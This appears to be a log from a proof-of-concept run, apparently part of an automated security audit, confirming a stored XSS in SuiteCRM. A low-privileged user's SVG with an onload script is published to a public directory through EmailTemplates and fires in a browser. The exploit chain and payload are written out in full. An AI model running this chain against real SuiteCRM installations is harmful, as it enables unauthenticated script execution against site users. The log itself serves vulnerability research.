@@ -1,0 +1,38 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-042/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-042/../.venv
+========================================================================
+VULN-042: Stored XSS via attacker SVG published to public/ (EmailTemplates)
+target: http://localhost:33116
+========================================================================
+[SETUP] creating a fresh low-privileged user as admin
+[OK] user created: mod_1ee64d6c id=4fca9b3a-57ec-44a8-b5e3-db875e6f93c2
+[STEP] legacy REST login as low-priv user
+[OK] REST session established (used_admin=False)
+[STEP] set_entry Notes -- create an empty Note to attach the SVG to
+[OK] Note created id=995b1a92-a9d2-46e4-8e05-f61cc1451183
+[STEP] set_note_attachment -- upload raw SVG bytes (base64) as the Note's attachment
+[INFO] set_note_attachment -> {'id': '995b1a92-a9d2-46e4-8e05-f61cc1451183'}
+[STEP] set_entry EmailTemplates -- body_html contains the entryPoint=download <img> tag
+[OK] EmailTemplate created id=36f01f76-51d2-4033-89d0-8dac169b956c
+[STEP] get_entry EmailTemplates -- triggers ->retrieve() -> repairEntryPointImages() -> makePublicImage()
+[INFO] get_entry -> entry_list present: True
+[STEP] verifying public/995b1a92-a9d2-46e4-8e05-f61cc1451183.svg was written on disk (app container)
+[PROOF] public/995b1a92-a9d2-46e4-8e05-f61cc1451183.svg on disk, byte-identical to uploaded SVG: True
+[INFO] on-disk content: '<svg xmlns="http://www.w3.org/2000/svg" onload="window.top.__vuln042_fired=true; alert(document.domain)"><circle cx="10" cy="10" r="5"/></svg>'
+[STEP] GET http://localhost:33116/public/995b1a92-a9d2-46e4-8e05-f61cc1451183.svg with NO session cookie (proving it is publicly served)
+[PROOF] HTTP 200, Content-Type: 'image/svg+xml', served inline: True
+[INFO] body: '<svg xmlns="http://www.w3.org/2000/svg" onload="window.top.__vuln042_fired=true; alert(document.domain)"><circle cx="10" cy="10" r="5"/></svg>'
+[STEP] launching headless Chromium (Playwright container) -- top-level navigation to the public SVG URL
+[INFO] docker run mcr.microsoft.com/playwright:latest node pw.js
+[INFO] navigating (no cookies) to http://localhost:33116/public/995b1a92-a9d2-46e4-8e05-f61cc1451183.svg
+[RESULT] {"fired":true,"dialogMessage":"localhost"}
+[INFO] high-level screenshot failed (page.screenshot: Timeout 8000ms exceeded.
+Call log:
+  - taking page screenshot
+  - waiting for fonts to load...
+  - fonts loaded
+), falling back to raw CDP capture
+[INFO] CDP screenshot fallback succeeded
+[PROOF] DOM sentinel window.top.__vuln042_fired = True
+[PROOF] alert() dialog fired with message: 'localhost'
+==> VULN-042: CONFIRMED — unauthenticated script execution from http://localhost:33116/public/995b1a92-a9d2-46e4-8e05-f61cc1451183.svg (sentinel + alert fired)
